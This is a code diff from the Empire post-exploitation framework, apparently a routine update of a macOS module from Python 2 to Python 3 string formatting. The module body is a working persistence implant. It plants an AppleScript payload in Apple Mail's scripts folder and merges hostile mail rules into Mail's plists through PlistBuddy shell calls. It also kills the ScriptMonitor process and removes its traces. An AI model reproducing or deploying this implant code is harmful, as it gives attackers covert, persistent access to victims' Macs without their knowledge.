@@ -1,4 +1,3 @@
-from builtins import object, range, str
 from random import choice
 from string import ascii_uppercase
 from time import time
@@ -7,7 +6,7 @@ from typing import Dict, Optional, Tuple
 from empire.server.core.module_models import EmpireModule
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -132,14 +131,14 @@ class Module(object):
         script = """
 import os
 home =  os.getenv("HOME")
-AppleScript = '%s'
-SyncedRules = '%s'
-RulesActiveState = '%s'
-plist = \"\"\"%s\"\"\"
-plist2 = \"\"\"%s\"\"\"
-payload = \'\'\'%s\'\'\'
+AppleScript = '{}'
+SyncedRules = '{}'
+RulesActiveState = '{}'
+plist = \"\"\"{}\"\"\"
+plist2 = \"\"\"{}\"\"\"
+payload = \'\'\'{}\'\'\'
 payload = payload.replace('&\"', '& ')
-payload += "kill `ps -ax | grep ScriptMonitor |grep -v grep |  awk \'{print($1)}\'`"
+payload += "kill `ps -ax | grep ScriptMonitor |grep -v grep |  awk \'{{print($1)}}\'`"
 payload += '\"'
 script = home + "/Library/Application Scripts/com.apple.mail/" + AppleScript
 
@@ -178,7 +177,7 @@ with open("/System/Library/CoreServices/SystemVersion.plist", 'r') as a:
 
 if os.path.isfile(home + "/Library/Mobile Documents/com~apple~mail/Data/" + version + "/MailData/ubiquitous_SyncedRules.plist"):
     print("Trying to write to Mobile")
-    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/" + version + "/MailData/ubiquitous_SyncedRules.plist")
+    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\\ Documents/com~apple~mail/Data/" + version + "/MailData/ubiquitous_SyncedRules.plist")
 else:
     os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mail/" + version + "/MailData/SyncedRules.plist")
     print("Writing to main rules")
@@ -186,7 +185,7 @@ else:
 os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/" + version + "/MailData/RulesActiveState.plist")
 os.system("rm " + SyncedRules)
 os.system("rm " + RulesActiveState)
-        """ % (
+        """.format(
             apple_script,
             synced_rules,
             rules_active_state,
